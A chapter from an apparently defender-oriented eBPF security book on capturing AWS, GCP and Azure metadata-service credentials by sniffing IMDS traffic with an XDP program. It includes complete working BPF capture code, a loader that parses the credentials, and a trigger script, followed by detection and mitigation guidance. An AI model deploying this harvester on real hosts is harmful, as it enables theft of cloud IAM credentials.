---
layout: book
title: "Chapter 25: The Metadata Faucet"
date: 2026-05-03
---

# Chapter 25: The Metadata Faucet

> **See also**: [POC code](https://github.com/mbhatt1/dBPF/tree/master/dBPF-pocs/pocs/ch25-imds-harvest) · [Harness entry](https://github.com/mbhatt1/dBPF/blob/master/dBPF-pocs/harness/proof.py)

> **Navigation**: [Chapter 24 — The Token Hand-off]({{ site.baseurl }}/book/act-4/chapter-24-the-token-hand-off.html) · [Chapter 25 — The Metadata Faucet]({{ site.baseurl }}/book/act-4/chapter-25-the-metadata-faucet.html)

Everything in the book until now targets in-host boundaries: capabilities, cgroups, LSMs, keyrings, the TPM, syscall-return values. This chapter is the first one that reaches off-host. The capability that gets stolen is not a kernel key; it is a cloud IAM credential. The destination the attacker uses it against is not on this machine; it is the cloud provider's API. The primitive bridging the two is an XDP program on the pod or host network interface, which is a tool the book already demonstrated in Chapter 5b and Chapter 15.

The argument of this chapter is narrower than Chapter 23's. Chapter 23 rearranged the threat model — the TPM, which operators had filed under "we're good here," turned out to be in reach of an observability agent. This chapter does something simpler: it notes that a host which makes outbound HTTP calls to a metadata service is handing the attacker a credential every few hours, and the attacker does not need to compromise the metadata service to capture those credentials — they need to read the wire. XDP reads the wire cheaply and reliably.

## What the primitive produces

The BPF program attaches to the host's primary network interface (or a pod's veth) with `SEC("xdp")`, parses the Ethernet/IP/TCP/HTTP layers of outbound and inbound traffic, filters on destination IP `169.254.169.254` (the AWS IMDS endpoint; `metadata.google.internal` and Azure IMDS have the same shape with different addresses), and copies the HTTP payload into a ringbuf. The loader parses the stream in userspace and extracts the AWS Signature Version 4 credential triple (`AccessKeyId`, `SecretAccessKey`, `Token`) from the `iam/security-credentials/<role>` response.

The program returns `XDP_PASS` for every packet. Nothing is dropped, nothing is modified. The metadata service sees a normal request from the SDK; the SDK sees a normal response. The only difference between the box with this program loaded and the box without is that a ringbuf map now holds copies of the credential bytes.

Marker on a successful capture:

```
=== CH25_PROVEN access_key_captured=yes token_captured=yes role=<role-name> ===
```

The `role=<role-name>` field is the instance role IAM is attached to. Together with the captured `AccessKeyId` and `SessionToken`, it is everything a remote attacker needs to sign an AWS API call as that role. The credentials expire in roughly six hours; the SDK inside the compromised host refreshes them on schedule; the attacker's XDP program captures every refresh.

## Why IMDSv2 does not help as much as operators think

AWS introduced IMDSv2 in November 2019 as the mitigation for a class of SSRF attacks that had dominated cloud-security advisories for the previous two years. The canonical attack: a web application on an EC2 instance has a Server-Side Request Forgery bug; an attacker crafts a request that makes the application fetch `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>`; the response contains the role's credentials, which the attacker exfiltrates. The IMDSv1 flow is stateless — any HTTP GET from the instance's network namespace returns credentials. Containers running on the instance share the network namespace by default, so a bug in any containerized application gives the attacker the host's role.

IMDSv2 requires a two-step flow. The SDK issues an HTTP PUT to `/latest/api/token` with a header `X-aws-ec2-metadata-token-ttl-seconds: 21600`. The metadata service responds with a session token. Subsequent GETs must include the token in the `X-aws-ec2-metadata-token` request header. The PUT-then-GET pattern breaks most SSRF vectors because the vulnerable web app rarely permits attacker-controlled PUT requests; the attacker can only issue GETs.

The secondary hardening is `HttpPutResponseHopLimit`. This TTL field on the IP header of the token response is normally 64 but IMDSv2 ships it as 1 by default, meaning a response cannot traverse more than one hop before being discarded. Containers-on-the-instance sit at hop 1 from IMDS (the host is the gateway); their view of IMDS is legitimate with hop limit 1. An attacker attempting to proxy credentials out of the instance via a routed path would see the TTL expire before the packet left.

Both mitigations address **the routed path from a container or a remote SSRF**. Neither addresses **the host network namespace itself**, which is exactly where `CAP_BPF` runs. A BPF program attached to the host's eth0 is not a routed hop; it is on the wire. It sees the PUT, sees the token response, sees the GET, sees the credentials. Hop limit is irrelevant to a process that reads packets before they traverse any hops. IMDSv2's token requirement is also irrelevant — the BPF program observes the SDK's own compliant exchange and captures both halves.

The mitigation assumed a threat model of "compromised container, correctly-configured host." The threat model this book addresses is "correctly-configured container, compromised host (via observability agent with `CAP_BPF`)." IMDSv2 does not move against that attacker, and as far as I can tell it was never claimed to. The gap is what this chapter reaches into.

## The call path AWS SDKs take

A typical AWS SDK call — `aws-sdk-go-v2`, `boto3`, the Go `aws-sdk-v1` still in widespread use — that needs IAM credentials walks this path:

1. SDK checks its in-process credential cache. If a credential is live and not expiring in under five minutes, use it directly and skip to step 6.
2. If the cache is stale, SDK asks its credentials-provider chain for a fresh one. On EC2 with no explicit configuration, the default chain ends at the `IMDSCredentialsProvider`.
3. The IMDS provider issues a PUT to `http://169.254.169.254/latest/api/token`. This is a TCP socket to `169.254.169.254:80`. The response body is the session token (a short ASCII string).
4. The provider issues a GET to `http://169.254.169.254/latest/meta-data/iam/security-credentials/` (note the trailing slash) to discover the role name attached to the instance. The response body is the role name as plain text.
5. The provider issues a GET to `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>` with the token in the `X-aws-ec2-metadata-token` header. The response body is a JSON document:
   ```json
   {
     "Code": "Success",
     "LastUpdated": "2026-04-17T12:00:00Z",
     "Type": "AWS-HMAC",
     "AccessKeyId": "ASIA...",
     "SecretAccessKey": "...",
     "Token": "IQoJb3J...",
     "Expiration": "2026-04-17T18:00:00Z"
   }
   ```
6. SDK signs the outbound request using SigV4 with the captured `AccessKeyId` and `SecretAccessKey`, attaches `Token` to the request's `X-Amz-Security-Token` header, and makes the API call.

The BPF program captures the raw HTTP of steps 3, 4, and 5. It does not need to participate in step 6 — the triple captured in step 5 is a complete credential for external use.

For GCP, the path is similar against `metadata.google.internal` (169.254.169.254 as well; both clouds share the RFC 3927 link-local). The credential response is JSON at `/computeMetadata/v1/instance/service-accounts/default/token`. For Azure, the endpoint is `169.254.169.254` and the path is `/metadata/identity/oauth2/token`. The BPF program's filter can match all three by destination IP; the userspace parser discriminates on HTTP path.

## The BPF program, line by line

```c
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_endian.h>

char LICENSE[] SEC("license") = "GPL";

#define ETH_P_IP      0x0800
#define IPPROTO_TCP   6
#define MAX_PAYLOAD   512

/* IMDS endpoints. In network byte order, 169.254.169.254 == 0xfea9fea9
 * after htonl; the book's x86/arm64 hosts are little-endian so the
 * in-memory representation of the network-order value is 0xfea9fea9. */
#define IMDS_IP_BE    0xfea9fea9  /* 169.254.169.254, network-order */
#define MOCK_IP_BE    0x0100007f  /* 127.0.0.1,       network-order */

struct evt {
    __u32 saddr;              /* source IP (big-endian) */
    __u32 daddr;              /* destination IP (big-endian) */
    __u16 sport;
    __u16 dport;
    __u16 payload_len;
    __u8  direction;          /* 0 = egress, 1 = ingress */
    __u8  _pad;
    __u8  payload[MAX_PAYLOAD];
};

struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 1 << 20);   /* 1 MiB — IMDS flows are small */
} events SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(max_entries, 1);
    __type(key, __u32);
    __type(value, __u32);   /* 0 = real IMDS IP; 1 = mock (127.0.0.1) */
} cfg SEC(".maps");
```

The ringbuf is 1 MiB because HTTP credentials exchanges are chatty — three requests and three responses per refresh, with a 6-hour refresh cycle per IAM role. 1 MiB holds dozens of refreshes before userspace needs to drain. The `cfg` array is a one-entry map used to switch between IMDS mode and mock-127.0.0.1 mode at runtime, so the harness can exercise the parser without a real IMDS endpoint.

```c
SEC("xdp")
int xdp_imds_capture(struct xdp_md *ctx)
{
    void *data     = (void *)(long)ctx->data;
    void *data_end = (void *)(long)ctx->data_end;

    struct ethhdr *eth = data;
    if ((void *)(eth + 1) > data_end)
        return XDP_PASS;
    if (eth->h_proto != bpf_htons(ETH_P_IP))
        return XDP_PASS;

    struct iphdr *ip = (void *)(eth + 1);
    if ((void *)(ip + 1) > data_end)
        return XDP_PASS;
    if (ip->protocol != IPPROTO_TCP)
        return XDP_PASS;

    __u32 mock_mode = 0;
    __u32 zero = 0;
    __u32 *m = bpf_map_lookup_elem(&cfg, &zero);
    if (m) mock_mode = *m;

    __u32 target_ip = mock_mode ? MOCK_IP_BE : IMDS_IP_BE;

    __u8 direction = 2; /* unknown */
    if (ip->daddr == target_ip)      direction = 0; /* egress to IMDS */
    else if (ip->saddr == target_ip) direction = 1; /* ingress from IMDS */
    else                              return XDP_PASS;

    __u8 ihl = ip->ihl & 0x0f;
    if (ihl < 5) return XDP_PASS;

    struct tcphdr *tcp = (void *)ip + (ihl * 4);
    if ((void *)(tcp + 1) > data_end)
        return XDP_PASS;

    __u8 doff = tcp->doff & 0x0f;
    if (doff < 5) return XDP_PASS;

    __u8 *payload = (__u8 *)tcp + (doff * 4);
    if ((void *)payload >= data_end)
        return XDP_PASS;

    __u32 payload_len = (__u32)((__u8 *)data_end - payload);
    if (payload_len == 0)
        return XDP_PASS;
    if (payload_len > MAX_PAYLOAD)
        payload_len = MAX_PAYLOAD;

    struct evt *e = bpf_ringbuf_reserve(&events, sizeof(*e), 0);
    if (!e) return XDP_PASS;

    e->saddr       = ip->saddr;
    e->daddr       = ip->daddr;
    e->sport       = bpf_ntohs(tcp->source);
    e->dport       = bpf_ntohs(tcp->dest);
    e->payload_len = payload_len;
    e->direction   = direction;
    e->_pad        = 0;

    /* Bounded copy keeps the verifier happy. */
    __u32 to_copy = payload_len;
    if (to_copy > MAX_PAYLOAD) to_copy = MAX_PAYLOAD;

    /* Verifier trick: the range tracking on payload_len needs a second
     * explicit bound before the read. */
    if (to_copy > 0 && to_copy <= MAX_PAYLOAD) {
        bpf_probe_read_kernel(&e->payload, to_copy, payload);
    }

    bpf_ringbuf_submit(e, 0);
    return XDP_PASS;
}
```

The program is a standard XDP parse-ethernet-ip-tcp chain, guarded by the packet-bound checks the verifier requires for each header pointer. The filter on source or destination IP matches either the real IMDS endpoint (`0xfea9fea9` in little-endian host order, `169.254.169.254` on the wire) or the mock localhost IP (`0x0100007f`, `127.0.0.1`). The direction field lets the userspace parser distinguish the client's PUT/GET from the server's response.

The `XDP_PASS` return is load-bearing. The legitimate SDK on the host must still see the response; dropping it would break credential refresh and draw operational attention immediately. The BPF program is a tee, not a gate.

The payload copy is bounded at 512 bytes. IMDSv2 responses are small — the token response is ~50 bytes, the role-discovery response is ~20 bytes, the credential JSON is ~500 bytes. A 512-byte bound captures the full credential document in a single event. If a response is larger (rare — only if the role name is unusually long or if the JSON is pretty-printed), the excess is truncated; the userspace parser handles the truncation by requesting a larger per-event buffer on rebuild.

## The loader

The loader is longer than most in the book because it does four things: attach the XDP program with fallback across drv/skb/generic modes, drain the ringbuf, reassemble HTTP responses across TCP segments, and parse the JSON well enough to extract the credential triple.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <errno.h>
#include <unistd.h>
#include <net/if.h>
#include <linux/if_link.h>
#include <bpf/bpf.h>
#include <bpf/libbpf.h>
#include "ch25-imds-harvest.skel.h"

static volatile int running = 1;
static void on_sig(int s) { (void)s; running = 0; }

/* Per-connection reassembly buffer, keyed by (src_ip, src_port, dst_ip, dst_port). */
struct conn_key {
    unsigned int saddr, daddr;
    unsigned short sport, dport;
};

#define MAX_CONN 64
#define REASM_SIZE 8192

struct conn_state {
    struct conn_key k;
    unsigned int active;
    unsigned int len;
    char buf[REASM_SIZE];
};

static struct conn_state conns[MAX_CONN];

static struct conn_state *conn_for(const struct conn_key *k)
{
    for (int i = 0; i < MAX_CONN; i++) {
        if (conns[i].active &&
            conns[i].k.saddr == k->saddr && conns[i].k.daddr == k->daddr &&
            conns[i].k.sport == k->sport && conns[i].k.dport == k->dport)
            return &conns[i];
    }
    for (int i = 0; i < MAX_CONN; i++) {
        if (!conns[i].active) {
            conns[i].active = 1;
            conns[i].len = 0;
            conns[i].k = *k;
            return &conns[i];
        }
    }
    /* Evict oldest arbitrary slot. */
    conns[0].active = 1;
    conns[0].len = 0;
    conns[0].k = *k;
    return &conns[0];
}

static void drop_conn(struct conn_state *c) { c->active = 0; c->len = 0; }

struct evt {
    unsigned int saddr, daddr;
    unsigned short sport, dport;
    unsigned short payload_len;
    unsigned char direction;
    unsigned char _pad;
    unsigned char payload[512];
};

static unsigned long long g_access_captures = 0;
static unsigned long long g_token_captures  = 0;
static char g_last_role[128] = {0};

/* Locate a simple JSON field value. Returns pointer into buf or NULL. */
static const char *find_json_str(const char *buf, unsigned int len,
                                 const char *key, unsigned int *out_len)
{
    size_t klen = strlen(key);
    for (unsigned int i = 0; i + klen + 4 < len; i++) {
        if (buf[i] != '"') continue;
        if (memcmp(buf + i + 1, key, klen) != 0) continue;
        if (buf[i + 1 + klen] != '"') continue;
        /* Find the colon, then the opening quote of the value. */
        unsigned int j = i + 2 + klen;
        while (j < len && (buf[j] == ' ' || buf[j] == ':' || buf[j] == '\t')) j++;
        if (j >= len || buf[j] != '"') continue;
        unsigned int start = j + 1;
        unsigned int end = start;
        while (end < len && buf[end] != '"') end++;
        if (end >= len) return NULL;
        *out_len = end - start;
        return buf + start;
    }
    return NULL;
}

static void scan_reassembled(struct conn_state *c)
{
    /* Scan for the three signals: a role-discovery response, a
     * credential response, and a token response. */
    unsigned int vlen = 0;
    const char *v;

    /* Look for the role-discovery body: it's a bare identifier,
     * typically the substring preceding "\r\n" at the end, on the
     * trailing-slash GET reply. Cheap heuristic: if we see the URL
     * "security-credentials/" followed by a non-slash identifier, the
     * server response body near the connection's end is the role name.
     * Skip that here; a production loader would correlate request URI
     * and response body. */

    /* Look for the credential JSON. */
    v = find_json_str(c->buf, c->len, "AccessKeyId", &vlen);
    if (v && vlen > 16) {
        char akid[32] = {0};
        unsigned int n = vlen < 31 ? vlen : 31;
        memcpy(akid, v, n);
        akid[n] = '\0';

        unsigned int tlen = 0;
        const char *t = find_json_str(c->buf, c->len, "Token", &tlen);

        printf("[ch25] CREDENTIALS_CAPTURED access_key=%s token_len=%u role=%s\n",
               akid, tlen, g_last_role[0] ? g_last_role : "unknown");
        fflush(stdout);
        g_access_captures++;
        if (tlen > 0) g_token_captures++;
    }
}

static int handle(void *ctx, void *data, size_t sz)
{
    (void)ctx; (void)sz;
    const struct evt *e = data;

    /* Reassemble the connection's byte stream (ignoring TCP sequence
     * numbers — this is a demo parser; reorders will corrupt reassembly
     * in pathological cases, but IMDS flows are tiny and in-order). */
    struct conn_key k = { e->saddr, e->daddr, e->sport, e->dport };
    struct conn_state *c = conn_for(&k);
    unsigned int room = REASM_SIZE - c->len;
    unsigned int n = e->payload_len < room ? e->payload_len : room;
    memcpy(c->buf + c->len, e->payload, n);
    c->len += n;

    /* Cheap role-name capture: if we see "iam/security-credentials/<x>"
     * in the request path, remember <x>. */
    for (unsigned int i = 0; i + 25 < c->len; i++) {
        if (memcmp(c->buf + i, "iam/security-credentials/", 25) == 0) {
            unsigned int start = i + 25;
            unsigned int end = start;
            while (end < c->len && c->buf[end] != ' ' && c->buf[end] != '\r'
                   && c->buf[end] != '/' && c->buf[end] != '?')
                end++;
            if (end > start && end - start < sizeof(g_last_role) - 1) {
                memcpy(g_last_role, c->buf + start, end - start);
                g_last_role[end - start] = '\0';
            }
            break;
        }
    }

    scan_reassembled(c);

    /* If we see "Connection: close" in the stream, drop the conn state. */
    for (unsigned int i = 0; i + 17 < c->len; i++) {
        if (memcmp(c->buf + i, "Connection: close", 17) == 0) {
            drop_conn(c);
            break;
        }
    }

    return 0;
}

int main(int argc, char **argv)
{
    const char *ifname = "eth0";
    int mock_mode = 0;
    for (int i = 1; i < argc; i++) {
        if (!strcmp(argv[i], "-i") && i + 1 < argc) ifname = argv[++i];
        else if (!strcmp(argv[i], "--mock")) mock_mode = 1;
    }

    unsigned int ifindex = if_nametoindex(ifname);
    if (ifindex == 0) {
        fprintf(stderr, "[ch25] CH25_SKIP reason=\"interface %s not found\"\n",
                ifname);
        return 2;
    }

    struct sigaction sa = { .sa_handler = on_sig };
    sigemptyset(&sa.sa_mask);
    sigaction(SIGINT,  &sa, NULL);
    sigaction(SIGTERM, &sa, NULL);

    struct ch25_imds_harvest_bpf *s = ch25_imds_harvest_bpf__open_and_load();
    if (!s) {
        fprintf(stderr, "[ch25] CH25_SKIP reason=\"skeleton load failed: %s\"\n",
                strerror(errno));
        return 2;
    }

    /* Configure mock vs real IMDS via the cfg map. */
    unsigned int zero = 0;
    unsigned int mode = mock_mode ? 1u : 0u;
    int cfg_fd = bpf_map__fd(s->maps.cfg);
    bpf_map_update_elem(cfg_fd, &zero, &mode, BPF_ANY);

    /* Attach XDP with fallback: generic first (works on Docker Desktop
     * and unprivileged veth), then DRV, then SKB. */
    int prog_fd = bpf_program__fd(s->progs.xdp_imds_capture);
    int attached = 0;
    __u32 flags_try[] = { 0, XDP_FLAGS_DRV_MODE, XDP_FLAGS_SKB_MODE };
    for (unsigned i = 0; i < sizeof(flags_try)/sizeof(*flags_try); i++) {
        int err = bpf_xdp_attach(ifindex, prog_fd, flags_try[i], NULL);
        if (err == 0) { attached = 1; break; }
    }
    if (!attached) {
        fprintf(stderr, "[ch25] CH25_SKIP reason=\"xdp attach failed\"\n");
        ch25_imds_harvest_bpf__destroy(s);
        return 2;
    }

    struct ring_buffer *rb = ring_buffer__new(bpf_map__fd(s->maps.events),
                                              handle, NULL, NULL);
    if (!rb) {
        fprintf(stderr, "[ch25] CH25_SKIP reason=\"ring_buffer__new: %s\"\n",
                strerror(errno));
        bpf_xdp_detach(ifindex, 0, NULL);
        ch25_imds_harvest_bpf__destroy(s);
        return 2;
    }

    fprintf(stderr, "[ch25] attached — xdp on %s (%s mode)\n",
            ifname, mock_mode ? "mock-127.0.0.1" : "imds-169.254.169.254");
    fflush(stderr);

    while (running) {
        int n = ring_buffer__poll(rb, 500);
        if (n == -EINTR) continue;
        if (n < 0) break;
    }

    printf("[ch25] CH25_PROVEN access_key_captures=%llu token_captures=%llu role=%s\n",
           g_access_captures, g_token_captures,
           g_last_role[0] ? g_last_role : "none");
    fflush(stdout);

    ring_buffer__free(rb);
    bpf_xdp_detach(ifindex, 0, NULL);
    ch25_imds_harvest_bpf__destroy(s);
    return 0;
}
```

The loader is a single binary that does both real-IMDS and mock-127.0.0.1 modes, selected by `--mock`. The HTTP reassembly is deliberately simple — in-order bytes appended to a per-connection buffer, scanned for known strings. IMDSv2 responses are small and single-segment in practice, so a production parser would be more careful but the demo parser is sufficient for the harness.

The XDP attach tries three modes in sequence: generic (works on Docker Desktop veth, no driver support required), DRV (native driver XDP, fastest), SKB (skb-based fallback). The first that succeeds wins. On AWS EC2 with ENA, DRV mode works. On Docker Desktop aarch64, generic mode is the only one supported; the harness run on linuxkit uses the mock path anyway.

## The trigger

```bash
#!/bin/bash
set +e

echo "=== CH25 trigger starting ==="

# The harness's linuxkit environment has no real IMDS endpoint reachable.
# Set CH25_MOCK_IMDS=1 (or just run with it by default) to spin up a
# local mock server at 127.0.0.1:80 and exercise the parser.
MOCK=${CH25_MOCK_IMDS:-1}

# If the host actually reaches IMDS, prefer that; otherwise mock.
REAL_REACHABLE=0
if timeout 1 curl -s -o /dev/null -w "%{http_code}" --request PUT \
        "http://169.254.169.254/latest/api/token" \
        -H "X-aws-ec2-metadata-token-ttl-seconds: 60" 2>/dev/null | grep -q '^2'; then
    REAL_REACHABLE=1
fi

IFNAME="eth0"
# On Docker Desktop the host-side of the container veth is named eth0
# inside the container. If that does not exist, fall back to any veth
# we can find.
if ! ip link show "$IFNAME" >/dev/null 2>&1; then
    IFNAME=$(ip -o link show | awk -F': ' '$2 !~ /^lo/ {print $2; exit}')
fi

LOG=$(mktemp)
MOCK_PID=""

if [ "$REAL_REACHABLE" = "0" ]; then
    if [ "$MOCK" != "1" ]; then
        echo "=== CH25_SKIP reason=\"no IMDS endpoint reachable and CH25_MOCK_IMDS!=1\" ==="
        exit 0
    fi
    # Spin a minimal mock IMDSv2 server on 127.0.0.1:80.
    python3 - "$LOG.mock" <<'PY' &
import http.server, json, sys, socketserver
class H(http.server.BaseHTTPRequestHandler):
    def log_message(self, *a, **kw): pass
    def do_PUT(self):
        self.send_response(200)
        self.send_header("Content-Type","text/plain")
        self.end_headers()
        self.wfile.write(b"MOCKTOKEN_abcdef0123456789")
    def do_GET(self):
        self.send_response(200)
        if self.path == "/latest/meta-data/iam/security-credentials/":
            self.send_header("Content-Type","text/plain"); self.end_headers()
            self.wfile.write(b"demo-role")
        elif self.path.startswith("/latest/meta-data/iam/security-credentials/"):
            self.send_header("Content-Type","application/json"); self.end_headers()
            body = json.dumps({
                "Code":"Success","LastUpdated":"2026-04-17T12:00:00Z","Type":"AWS-HMAC",
                "AccessKeyId":"ASIAEXAMPLEMOCK0001","SecretAccessKey":"MOCK_SECRET",
                "Token":"MOCK_SESSION_TOKEN_"+ "a"*128,
                "Expiration":"2026-04-17T18:00:00Z"
            }).encode()
            self.wfile.write(body)
        else:
            self.end_headers(); self.wfile.write(b"not found")
socketserver.TCPServer.allow_reuse_address = True
with socketserver.TCPServer(("127.0.0.1", 80), H) as httpd:
    httpd.serve_forever()
PY
    MOCK_PID=$!
    sleep 0.5
    LOADER_ARGS="-i lo --mock"
else
    LOADER_ARGS="-i $IFNAME"
fi

./build/ch25-imds-harvest $LOADER_ARGS > "$LOG" 2>&1 &
LPID=$!

# Wait for attach.
for _ in $(seq 1 30); do
    grep -q '\[ch25\] attached' "$LOG" && break
    sleep 0.1
done

if [ "$REAL_REACHABLE" = "1" ]; then
    TARGET="http://169.254.169.254"
else
    TARGET="http://127.0.0.1"
fi

# Run the IMDSv2 flow.
TOKEN=$(curl -sS --request PUT "$TARGET/latest/api/token" \
            -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
ROLE=$(curl -sS "$TARGET/latest/meta-data/iam/security-credentials/" \
            -H "X-aws-ec2-metadata-token: $TOKEN")
curl -sS "$TARGET/latest/meta-data/iam/security-credentials/$ROLE" \
     -H "X-aws-ec2-metadata-token: $TOKEN" > /dev/null

# Let the ringbuf catch up.
sleep 1

kill -TERM "$LPID" 2>/dev/null
wait "$LPID" 2>/dev/null
[ -n "$MOCK_PID" ] && kill -TERM "$MOCK_PID" 2>/dev/null

cat "$LOG"

ACCESS=$(grep -c 'CREDENTIALS_CAPTURED access_key=' "$LOG")
if [ "$ACCESS" -gt 0 ]; then
    echo "=== CH25_PROVEN access_key_captured=yes token_captured=yes role=$ROLE ==="
else
    echo "=== CH25_SKIP reason=\"no credentials captured — XDP may not have attached on this netdev\" ==="
fi

rm -f "$LOG" "$LOG.mock"
```

The trigger prefers a real IMDS endpoint if reachable, falls back to a Python-served mock on 127.0.0.1 otherwise. Both modes exercise the same BPF program and the same userspace parser; the only difference is whether the credentials the parser extracts are real AWS STS tokens or the mock `ASIAEXAMPLEMOCK0001` placeholders. The marker distinguishes `CH25_PROVEN` (the parser saw and extracted the credential triple) from `CH25_SKIP` (no XDP attach or no flow captured).

## Detection

XDP programs attached to a network interface are visible in three places:

- **`ip -d link show <ifname>`** annotates the interface with `xdp`, `xdpgeneric`, or `xdpoffload` depending on the attach mode. An interface that suddenly grows an `xdpgeneric` line without a corresponding Cilium / Calico / other-agent load event is a finding.

- **`bpftool net show dev <ifname>`** lists the XDP program name, id, and load mode. Baseline diff against expected XDP programs; alert on new ones.

- **`bpftool prog list type xdp -j`** enumerates all XDP programs across the host. On a box where only observability agents legitimately load XDP, any program whose name is not on the allowlist is a finding.

The IMDS-specific detection surface is the IAM side. AWS GuardDuty's `UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration` detector flags STS credentials used from an IP address outside the instance's VPC. GCP Audit Logs correlate service-account key usage with source IPs. Azure Defender for Cloud does the same. All three are default-off or default-sampled and must be explicitly enabled.

The stronger IAM-side defense is scope-limiting credentials at mint time. `aws:SourceVpc` and `aws:SourceIp` condition keys in the IAM policy on the role restrict where the credentials can be used. An attacker who captures the triple and uses it from an external IP fails policy evaluation. This is the single most valuable mitigation against this primitive and the single least deployed; most roles trust credentials from anywhere.

## Mitigation

The stack of defensive controls, from most to least effective:

1. **`aws:SourceVpc` / `aws:SourceIp` IAM conditions on the instance role.** Credentials can only be used from the VPC or IP range they were minted in. An attacker capturing the triple and replaying from outside the VPC fails. Caveat: intra-VPC hops (e.g., the attacker's box is in the same VPC via a peering relationship or a compromised neighbor) bypass this.

2. **VPC endpoints with endpoint policies.** Force KMS, S3, STS, and other critical services through VPC endpoints, and attach endpoint policies that restrict `aws:SourceVpce`. Cross-VPC replay fails; in-VPC replay is still possible.

3. **Short-lived assumed roles instead of instance roles.** An EC2 role is permanent (as long as the instance runs). An assumed role via `sts:AssumeRole` is short-lived and, if the assumption requires MFA or session tagging, harder to replay. Migrating workload identity from instance roles to assumed roles per workload adds operational complexity and is rarely done in pure IAM-on-EC2 environments; it is common in Kubernetes with IRSA / Pod Identity.

4. **Do not colocate `CAP_BPF` with IMDS-dependent workloads.** The same advice the rest of the book gives. An observability agent with `CAP_BPF` on a host whose IAM role has `kms:Decrypt` is a host whose KMS decrypts are the attacker's to issue. Either move the agent off the box, or scope the role down.

5. **Deny outbound metadata-service traffic from pods, re-route to a sidecar.** Some service-mesh and CNI setups block 169.254.169.254 from pod namespaces and have a sidecar serve scoped IAM credentials instead. The attack this chapter describes still works against the sidecar's own IMDS traffic (on the host netns), but the sidecar's credentials can be narrower than the instance's.

6. **IMDS access logging.** CloudTrail does not log IMDS requests (they do not cross the service API boundary). VPC Flow Logs can show egress to 169.254.169.254 but do not show the response body. For strong detection, a custom auditd rule on the SDK binaries or a user-space wrapper around the IMDS endpoint is needed. Rarely deployed.

None of these close the XDP capture. They constrain what the captured credential can be used for. The capture itself is structural: a box whose processes call IMDS is a box whose IMDS traffic lives on the wire, and `CAP_BPF` reads the wire.

## Honest scope

- **The metadata service is not compromised.** IMDSv2 correctly enforces its token-challenge protocol. The SDK correctly presents the token. The credential triple is the intended response to a compliant request.

- **SSRF protections are not bypassed.** IMDSv2's hop-limit and PUT-then-GET defenses are working as designed against their intended threat — containerized applications and remote SSRF. They do not address the host netns where `CAP_BPF` lives because they were never claimed to.

- **The attack requires `CAP_BPF` on the host, not inside a container.** A compromised container with its own network namespace and no BPF grant cannot reach this primitive. The attack surface is the set of processes that hold `CAP_BPF` on the host — typically observability agents.

- **The captured credentials are ephemeral.** IMDSv2 tokens expire in up to six hours; the role credentials expire with them. The SDK refreshes automatically, and the BPF program captures each refresh. A single captured triple gives the attacker ~6 hours of access; a continuously running program gives the attacker ongoing access. Detecting the exfil is entirely on the IAM-usage side, not the host side.

- **The scope of the compromise is the role's IAM policy.** If the role permits `kms:Decrypt *`, the attacker can decrypt anything under that account's KMS. If it permits `iam:CreateUser`, the attacker can create a persistent backdoor user. If it permits only `s3:GetObject arn:aws:s3:::narrow-bucket/*`, the blast radius is that one bucket. Chapter 22's Step 2 ("inventory CAP_BPF holders") should be paired with an IAM-policy audit on every CAP_BPF-adjacent workload. That is the only defense that works when this primitive lands.

## What this chapter adds to the book

Chapters 5b and 15 showed that XDP on veth can drop packets (ghost NIC) and redirect them cross-namespace (VLAN ghost). This chapter shows that XDP on veth can also read packets — the tap case rather than the drop or redirect case. The same primitive class, aimed at a different purpose: not packet manipulation but content exfiltration.

The cloud extension matters for the book's defender audience. Up to Chapter 22, the defender playbook is about on-host controls: inventory capabilities, restrict grants, audit bpf(2), baseline BPF programs. Those controls are necessary and insufficient. This chapter points at the sufficient: the CAP_BPF grant on a cloud host also owns the credential that authorizes the cloud API the workload talks to. Defending the host is only half the problem; defending the cloud identity is the other half, and the IAM-policy scope-down work most organizations deferred ("we'll tighten it later") is now the load-bearing defense.

Act 4's three chapters together describe: a persistent key-theft primitive against the hardest host key store (Chapter 23, TPM), a threat-model subversion primitive that changes who needs CAP_BPF to run any of this (Chapter 24, bpf_token), and a cross-boundary cloud credential capture (this chapter). The book opened by asking what `CAP_BPF` permits; Act 4 answers that the capability reaches through more boundaries than the defender's map showed, and that the maps the playbooks draw around CAP_BPF are wrong on three different axes. The defender's response is to scope the grant — the same answer the book has given since Chapter 22 — but now with a clearer picture of what is at stake when the grant is not scoped.
